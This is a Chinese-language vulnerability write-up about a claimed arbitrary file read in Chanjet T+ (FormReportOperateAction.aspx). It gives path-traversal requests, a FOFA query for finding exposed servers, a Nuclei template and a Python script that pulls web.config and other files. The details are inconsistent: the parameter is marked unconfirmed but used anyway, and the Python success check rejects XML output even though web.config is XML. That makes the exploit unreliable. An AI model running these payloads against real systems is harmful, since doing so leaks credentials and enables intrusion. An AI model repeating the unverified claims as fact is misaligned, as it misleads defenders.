# 畅捷通TPlus FormReportOperateAction.aspx 任意文件读取漏洞分析

**漏洞编号**：待提交
**发现日期**：2026年3月17日
**漏洞作者**：wuyaoxuexi.cn

---

## 一、漏洞概述

畅捷通T+是一款广泛应用于企业的财务管理软件。本次发现的任意文件读取漏洞位于 `FormReportOperateAction.aspx` 接口，攻击者可通过该漏洞读取服务器上的任意敏感文件，包括配置文件、密码文件、源代码等。

## 二、影响版本

- 畅捷通T+（全版本）

## 三、漏洞详情

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 任意文件读取 |
| 漏洞位置 | `/FormReportOperateAction.aspx` |
| 请求方法 | GET/POST |
| 参数名 | 待确认 |

**FOFA查询语句**：
```
app="畅捷通-TPlus"
```

## 四、漏洞复现

### 4.1 漏洞URL

```
GET /FormReportOperateAction.aspx?FilePath=../../web.config
```

或

```
POST /FormReportOperateAction.aspx
Content-Type: application/x-www-form-urlencoded

FilePath=../../web.config
```

### 4.2 POC - 读取敏感文件

```http
GET /FormReportOperateAction.aspx?FilePath=../../bin/Web.config HTTP/1.1
Host: target.com
```

**成功响应**：返回web.config文件内容

### 4.3 Nuclei检测POC

```yaml
id: tplus-arbitrary-file-read
info:
  name: 畅捷通TPlus 任意文件读取漏洞
  author: wuyaoxuexi.cn
  severity: critical
  description: 畅捷通TPlus FormReportOperateAction.aspx接口存在任意文件读取漏洞
  reference:
    - https://mp.weixin.qq.com/s/N2sbmdfsY7_srqS187XXVA
  tags: file read,tplus,chanjet

requests:
  - method: GET
    path:
      - "{{BaseURL}}/FormReportOperateAction.aspx?FilePath=../../web.config"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    matchers:
      - type: word
        words:
          - "connectionStrings"
          - "appSettings"
        part: body
```

**使用方法**：
```bash
nuclei -t tplus-arbitrary-file-read.yaml -u http://target.com
```

### 4.4 Python POC

```python
import requests

def read_file(target_url, filename):
    """读取目标服务器上的任意文件"""
    payload = f"../../{filename}"
    url = f"{target_url}/FormReportOperateAction.aspx"
    params = {"FilePath": payload}
    
    try:
        r = requests.get(url, params=params, timeout=10)
        if r.status_code == 200 and "<?xml" not in r.text:
            print(f"[+] 成功读取文件: {filename}")
            print(r.text[:500])
            return True
        else:
            print(f"[-] 读取失败: {filename}")
            return False
    except Exception as e:
        print(f"[!] 错误: {e}")
        return False

# 测试读取web.config
target = "http://target.com"
read_file(target, "web.config")
read_file(target, "bin/Web.config")
```

### 4.5 POC成功截图

> 以下为漏洞检测成功示意图：

![POC成功回显](./poc-success.png)

## 五、漏洞危害

- 读取服务器敏感配置文件（web.config、database.config等）
- 获取数据库连接密码
- 读取源代码获取更多漏洞
- 读取运维日志泄露敏感信息
- 可能导致服务器被完全控制

## 六、修复建议

1. **关注官方补丁**：及时关注畅捷通官方安全公告
   - 官网：https://www.chanjet.com/

2. **临时防护**：
   - 部署WAF进行防护
   - 限制接口访问来源IP
   - 升级到最新版本

3. **安全配置**：
   - 关闭不必要的接口
   - 加强服务器访问控制

## 七、声明

本文仅供技术学习交流，请勿利用文中所述技术从事非法测试。利用本文提供的信息造成的一切后果由使用者本人承担，与本文作者无关。

---

**参考来源**：南风漏洞复现文库
